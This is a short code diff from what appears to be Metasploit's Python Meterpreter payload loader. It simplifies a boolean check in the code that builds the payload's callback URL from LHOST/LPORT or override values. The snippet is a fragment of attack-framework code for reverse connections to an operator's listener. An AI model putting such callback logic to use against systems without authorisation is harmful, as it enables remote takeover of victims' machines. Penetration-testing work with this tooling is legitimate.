@@ -110,9 +110,9 @@ module Payload::Python::MeterpreterLoader
       callback_url = [
         opts[:url].to_s.split(':')[0],
         '://',
-        (ds['OverrideRequestHost'] == true ? ds['OverrideRequestLHOST'] : ds['LHOST']).to_s,
+        (ds['OverrideRequestHost'] ? ds['OverrideRequestLHOST'] : ds['LHOST']).to_s,
         ':',
-        (ds['OverrideRequestHost'] == true ? ds['OverrideRequestLPORT'] : ds['LPORT']).to_s,
+        (ds['OverrideRequestHost'] ? ds['OverrideRequestLPORT'] : ds['LPORT']).to_s,
         ds['LURI'].to_s,
         uri,
         '/'
